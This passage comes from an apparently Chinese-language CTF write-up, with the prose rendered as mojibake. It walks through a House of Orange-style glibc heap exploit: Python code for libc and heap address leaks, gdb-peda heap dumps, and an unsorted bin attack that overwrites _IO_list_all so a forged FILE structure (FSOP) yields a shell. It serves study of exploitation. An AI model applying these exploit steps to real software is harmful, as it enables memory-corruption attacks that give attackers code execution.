len(pay), <span class="number">1</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œpayload å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x55555577a010 (size : 0x20ff0)</span><br><span class="line">       last_remainder: 0x555555758120 (size : 0xec0)</span><br><span class="line">            unsortbin: 0x555555758120 (size : 0xec0)</span><br><span class="line">gdb-peda$ parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x555555758000      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758020      0x0                 0xa0                 Used                None              None</span><br><span class="line">0x5555557580c0      0x0                 0x20                 Used                None              None</span><br><span class="line">0x5555557580e0      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758100      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758120      0x0                 0xec0                Freed     0x2aaaab097b78    0x2aaaab097b78</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ old top chunk è¢«æ”¾åˆ°äº† unsortbin é‡Œï¼Œæ­¤æ—¶æˆ‘ä»¬ä¹Ÿæœ‰äº† main_arean åœ°å€ã€‚</p><h4 id="build-a-large-chunk-and-info-leak"><a href="#build-a-large-chunk-and-info-leak" class="headerlink" title="build a large chunk and info leak"></a>build a large chunk and info leak</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">build(<span class="string">&#x27;2&#x27;</span>, <span class="number">0x400</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = myu64(io.recvn(<span class="number">6</span>)) &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + hex(libc_addr) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3bd000</span></span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + hex(libc.address) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap with fd_nextsize, bk_nextsize</span></span><br><span class="line">upgrade(<span class="string">&#x27;2&#x27;</span> * <span class="number">0x10</span>, <span class="number">0x400</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&quot;2&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_addr = myu64(io.recvn(<span class="number">6</span>)) - <span class="number">0x140</span></span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + hex(heap_addr) + <span class="string">&quot;\033[0m&quot;</span>)</span><br></pre></td></tr></table></figure><p>å½“build 2 ä¸€ä¸ªlarge bin çš„æ—¶å€™ å³ å¤§äº 512 å­—èŠ‚çš„ chunkï¼Œä¸ºå‘ç”ŸåŸç†å†™çš„é‚£ä¸ªtrick å¾—åˆ°heapåœ°å€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x555555758000      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758020      0x0                 0xa0                 Used                None              None</span><br><span class="line">0x5555557580c0      0x0                 0x20                 Used                None              None</span><br><span class="line">0x5555557580e0      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758100      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758120      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758140      0x0                 0x410                Used                None              None</span><br><span class="line">0x555555758550      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758570      0x0                 0xa70                Freed     0x2aaaab097b78    0x2aaaab097b78</span><br><span class="line">0x555555758fe0      0xa70               0x10                 Used                None              None</span><br><span class="line">0x555555758ff0      0x0                 0x10                 Freed                0x0               0x0</span><br><span class="line">Corrupt ?! (size == 0) (0x555555759000)</span><br><span class="line">gdb-peda$ mergeinfo 0x555555758140</span><br><span class="line">==================================</span><br><span class="line">            Merge info</span><br><span class="line">==================================</span><br><span class="line">The chunk will not merge with other</span><br><span class="line">gdb-peda$ x/20gx 0x555555758140</span><br><span class="line">0x555555758140:0x00000000000000000x0000000000000411</span><br><span class="line">0x555555758150:0x00002aaaab090a320x00002aaaab098188</span><br><span class="line">0x555555758160:0x00005555557581400x0000555555758140</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½å¾—åˆ°äº† libc åœ°å€å’Œheapåœ°å€ã€‚</p><h4 id="File-Stream-Oriented-Programmingï¼ˆFSOPï¼‰"><a href="#File-Stream-Oriented-Programmingï¼ˆFSOPï¼‰" class="headerlink" title="File Stream Oriented Programmingï¼ˆFSOPï¼‰"></a>File Stream Oriented Programmingï¼ˆFSOPï¼‰</h4><p>ç´§æ¥ç€ï¼Œæˆ‘ä»¬é¢ä¸´çš„å¦å¤–ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¦‚ä½•æ§åˆ¶ç¨‹åºæµç¨‹ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œå‡ºç°å†…å­˜é”™è¯¯çš„æ—¶å€™ä¸€èˆ¬ä¼šè°ƒç”¨<code>malloc_printerr</code>ï¼Œå°±åƒä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3547              if (__builtin_expect (fastbin_index (chunksize (victim)) !&#x3D; idx, 0))</span><br><span class="line">3548                malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);</span><br></pre></td></tr></table></figure><p>æ¥ç€è·Ÿè¿›ä¸€ä¸‹ï¼Œå‘ç°è°ƒç”¨äº†<code>__libc_message</code>ï¼Œå¹¶ä¸”<code>action=do_abort</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">5285    malloc_printerr (const char *str)</span><br><span class="line">5286    &#123;</span><br><span class="line">5287      __libc_message (do_abort, &quot;%s\n&quot;, str);</span><br><span class="line">5288      __builtin_unreachable ();</span><br><span class="line">5289    &#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€å°±æ˜¯è°ƒç”¨<code>abort</code>äº†ï¼š<a href="https://code.woboq.org/userspace/glibc/sysdeps/posix/libc_fatal.c.html#175">é“¾æ¥</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">175   if ((action &amp; do_abort))</span><br><span class="line">176     &#123;</span><br><span class="line">177       if ((action &amp; do_backtrace))</span><br><span class="line">178         BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line">179 </span><br><span class="line">180       &#x2F;* Kill the application.  *&#x2F;</span><br><span class="line">181       abort ();</span><br><span class="line">182     &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¥ç€å°±ä¼šè°ƒç”¨<code>fflush</code>ï¼š<a href="https://code.woboq.org/userspace/glibc/stdlib/abort.c.html#abort">é“¾æ¥</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">70    &#x2F;* Flush all streams.  We cannot close them now because the user</span><br><span class="line">71       might have registered a handler for SIGABRT.  *&#x2F;</span><br><span class="line">72    if (stage &#x3D;&#x3D; 1)</span><br><span class="line">73      &#123;</span><br><span class="line">74        ++stage;</span><br><span class="line">75        fflush (NULL);</span><br><span class="line">76      &#125;</span><br></pre></td></tr></table></figure><p>è€Œ<code>fflush</code>å¯¹åº”ç€ä¸‹é¢è¿™ä¸ªå‡½æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5   #define fflush(s) _IO_flush_all_lockp (0)</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯å…³é”®äº†ï¼š<a href="https://code.woboq.org/userspace/glibc/libio/genops.c.html#_IO_flush_all_lockp">é“¾æ¥</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)<span class="comment">// æ±‡ç¼–abort + 248è°ƒç”¨</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);<span class="comment">// éœ€è¦è¦†ç›–çš„åœ°æ–¹</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="comment">// éœ€è¦ç¯¡æ”¹ä¸ºsystemçš„å‡½æ•° æ±‡ç¼–b *_IO_flush_all_lockp+356</span></span><br><span class="line">        result = EOF;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![image-20190305040412416](/Users/swing/Library/Application Support/typora-user-images/image-20190305040412416.png)</p><p>å¦‚æœæˆ‘ä»¬èƒ½ä¼ªé€ ä¸Šè¿°çš„file struck ï¼Œé‚£ä¹ˆå°±èƒ½get shellï¼Œä¼ªé€ çš„å‰æï¼Œæˆ‘ä»¬å¾—èƒ½æ§åˆ¶ _IO_list_all .æ­¤æ—¶æˆ‘ä»¬åœ¨unsorted bin å’Œ å †æº¢å‡ºçš„æ¡ä»¶ä¸‹ï¼Œæ˜¯èƒ½åˆ©ç”¨ unsortbin attack ï¼Œå‘ _IO_list_all å†™å…¥ä¸€ä¸ªæŒ‡é’ˆã€‚</p><p><code>unsortbin attack</code>æ˜¯æ€ä¹ˆä¸€å›äº‹å‘¢ï¼Œå…¶å®å°±æ˜¯åœ¨<code>malloc</code>çš„è¿‡ç¨‹ä¸­ï¼Œ<code>unsortbin</code>ä¼šä»é“¾è¡¨ä¸Šå¸ä¸‹æ¥ï¼ˆåªè¦åˆ†é…çš„å¤§å°ä¸æ˜¯<code>fastchunk</code>å¤§å°ï¼‰ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šä»£ç æ‰€ç¤ºï¼Œå°±æ˜¯ä¼šæŠŠ<code>bk+0x10</code>çš„åœ°æ–¹å†™å…¥æœ¬unsort_binçš„åœ°å€ï¼Œ </p><p>å½“ fake äº† unsoted bin çš„ bkçš„æ—¶å€™ï¼Œå†ä¸€æ¬¡malloc æ—¶å€™ï¼Œåœ¨_ini_malloc å³å¯å®Œæˆ unsortbin attackã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x7fffffffe59f --&gt; 0xa00 (<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">RBX: 0x2aaaab097b20 --&gt; 0x100000001</span><br><span class="line">RCX: 0x7c (<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">RDX: 0x2aaaab097b28 --&gt; 0x0</span><br><span class="line">RSI: 0x60 (<span class="string">&#x27;`&#x27;</span>)</span><br><span class="line">RDI: 0x7fffffffe5a0 --&gt; 0xa (<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">RBP: 0x20 (<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">RSP: 0x7fffffffe520 --&gt; 0x2</span><br><span class="line">RIP: 0x2aaaaad54e10 (&lt;_int_malloc+656&gt;:mov    QWORD PTR [r15+0x10],r12)</span><br><span class="line">R8 : 0x0</span><br><span class="line">R9 : 0x1999999999999999</span><br><span class="line">R10: 0x0</span><br><span class="line">R11: 0x2aaaaae4a5e0 --&gt; 0x2000200020002</span><br><span class="line">R12: 0x2aaaab097b78 --&gt; 0x55555577a010 --&gt; 0x0</span><br><span class="line">R13: 0x555555758570 --&gt; 0x68732f6e69622f (<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">R14: 0x2710</span><br><span class="line">R15: 0x2aaaab098510 --&gt; 0x0</span><br><span class="line">EFLAGS: 0x287 (CARRY PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x2aaaaad54e03 &lt;_int_malloc+643&gt;:je     0x2aaaaad54fa0 &lt;_int_malloc+1056&gt;</span><br><span class="line">   0x2aaaaad54e09 &lt;_int_malloc+649&gt;:cmp    rbp,rsi</span><br><span class="line">   0x2aaaaad54e0c &lt;_int_malloc+652&gt;:mov    QWORD PTR [rbx+0x70],r15</span><br><span class="line">=&gt; 0x2aaaaad54e10 &lt;_int_malloc+656&gt;:mov    QWORD PTR [r15+0x10],r12</span><br><span class="line">   0x2aaaaad54e14 &lt;_int_malloc+660&gt;:je     0x2aaaaad552c8 &lt;_int_malloc+1864&gt;</span><br><span class="line">   0x2aaaaad54e1a &lt;_int_malloc+666&gt;:cmp    rsi,0x3ff</span><br><span class="line">   0x2aaaaad54e21 &lt;_int_malloc+673&gt;:jbe    0x2aaaaad54d80 &lt;_int_malloc+512&gt;</span><br><span class="line">   0x2aaaaad54e27 &lt;_int_malloc+679&gt;:mov    rax,rsi</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffe520 --&gt; 0x2</span><br><span class="line">0008| 0x7fffffffe528 --&gt; 0x10</span><br><span class="line">0016| 0x7fffffffe530 --&gt; 0x7fffffffe5a0 --&gt; 0xa (<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">0024| 0x7fffffffe538 --&gt; 0x7fffffffe740 --&gt; 0x1</span><br><span class="line">0032| 0x7fffffffe540 --&gt; 0x0</span><br><span class="line">0040| 0x7fffffffe548 --&gt; 0x0</span><br><span class="line">0048| 0x7fffffffe550 --&gt; 0xffff800000001a61</span><br><span class="line">0056| 0x7fffffffe558 --&gt; 0x7fffffffe59f --&gt; 0xa00 (<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">3516<span class="keyword">in</span> malloc.c</span><br><span class="line">1: _IO_list_all = (struct _IO_FILE_plus *) 0x2aaaab098540 &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œ<code>mov    QWORD PTR [r15+0x10],r12</code></p><p><code>R12: 0x2aaaab097b78 --&gt; 0x55555577a010 --&gt; 0x0</code> ,<code>R15: 0x2aaaab098510 --&gt; 0x0</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p _IO_list_all</span><br><span class="line"><span class="variable">$11</span> = (struct _IO_FILE_plus *) 0x2aaaab097b78 &lt;main_arena+88&gt;</span><br></pre></td></tr></table></figure><p> _IO_list_all è¢« ä¿®æ”¹æˆ 0x2aaaab097b78 addr ã€‚</p><p>æ­¤æ—¶ _IO_list_all â€”&gt; main_arean ã€‚å¦å¤–ä¸€ä¸ªé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬è™½ç„¶æ§åˆ¶äº† _IO_list_all ,ä½†æ˜¯æ— æ³•ä¿®æ”¹main_arean çš„å€¼ã€‚</p><p>æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œæ­¤æ—¶ main_arean è¢«å½“åš file struct ï¼Œåˆ™åº”æœ‰å¦‚ä¸‹ç»“æ„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span>  </span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags  </span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>  </span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span>  </span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span>  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span>  </span><br><span class="line">  <span class="keyword">int</span> _fileno;<span class="comment">//è¿™ä¸ªå°±æ˜¯linuxå†…æ ¸ä¸­æ–‡ä»¶æè¿°ç¬¦fd  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0  </span></span><br><span class="line">  <span class="keyword">int</span> _blksize;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  </span></span><br><span class="line">  <span class="keyword">int</span> _flags2;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span>  </span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span>  </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;  </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;  </span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];  </span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span>  </span><br><span class="line">  _IO_lock_t *_lock;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE  </span></span><br><span class="line">&#125;;  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  _IO_FILE file;  </span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span><span class="comment">//IOå‡½æ•°è·³è½¬è¡¨  </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œè¿™é‡Œ <code>struct _IO_FILE *_chain;  </code></p><p>_IO_File æ˜¯ä¸ªæ–‡ä»¶ç»“æ„ä½“ï¼Œ<code>_chain</code> æŒ‡å‘äº†ä¸‹ä¸€ä¸ªç»“æ„ä½“ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ chain æŒ‡å‘ heap buffer ï¼Œæˆ‘ä»¬å°±èƒ½æ„é€ ä¸€ä¸ªå®Œæ•´çš„file struct ï¼Œé‚£ä¹ˆæ­¤åˆ»è¦è§£å†³çš„é—®é¢˜å°±æ˜¯å¦‚ä½•æ§åˆ¶ chain æŒ‡å‘ heap buufer å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æ­¤åˆ»çŸ¥é“ï¼Œ chain åœ¨ file structçš„offset ä¸º0x68</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;((struct _IO_FILE*)0)-&gt;_chain</span><br><span class="line"><span class="variable">$13</span> = (struct _IO_FILE **) 0x68</span><br></pre></td></tr></table></figure><p>Unsortbin  ä½äºbin[1] åé¢çš„çš„62ä¸ªbin å‡ä¸º smallbin</p><p>small bins ä¸­æ¯ä¸ª chunk çš„å¤§å°ä¸å…¶æ‰€åœ¨çš„ bin çš„ index çš„å…³ç³»ä¸ºï¼šchunk_size = 2 * SIZE_SZ *indexï¼Œå…·ä½“å¦‚ä¸‹</p><table><thead><tr><th>ä¸‹æ ‡</th><th>SIZE_SZ=4ï¼ˆ32 ä½ï¼‰</th><th>SIZE_SZ=8ï¼ˆ64 ä½ï¼‰</th></tr></thead><tbody><tr><td>2</td><td>16</td><td>32</td></tr><tr><td>3</td><td>24</td><td>48</td></tr><tr><td>4</td><td>32</td><td>64</td></tr><tr><td>5</td><td>40</td><td>80</td></tr><tr><td>x</td><td>2<em>4</em>x</td><td>2<em>8</em>x</td></tr><tr><td>63</td><td>504</td><td>1008</td></tr></tbody></table><p>æ­¤æ—¶ offset = 0x68 åœ¨ bin[4]</p><p><code>fp-&gt;_chain = fp+0x68 = unsorted_bin + 0x68</code></p><p><code>bins[2-6]</code>éƒ½æ˜¯<code>smallbins</code>çš„èŒƒå›´ï¼Œå¤§å°ä¸º0x20,0x30,0x40,0x50,0x60ã€‚æ‰€ä»¥ä¸ºäº†è®©<code>fp</code>æŒ‡å‘æˆ‘ä»¬æŒ‡å®šçš„ä½ç½®ï¼Œå°±éœ€è¦è®©<code>bins[6]</code>å³0x60çš„<code>smallbin</code>æ˜¯æˆ‘ä»¬æ§åˆ¶çš„ã€‚<br>é‚£ä¹ˆç°åœ¨<code>unsorted bin</code>ä¸­å­˜åœ¨å”¯ä¸€çš„<code>chunk</code>ä¸º<code>top</code>ï¼Œæˆ‘ä»¬å°†å®ƒçš„å¤§å°æ”¹ä¸º<code>0x61</code>ï¼ˆå› ä¸º<code>unsorted 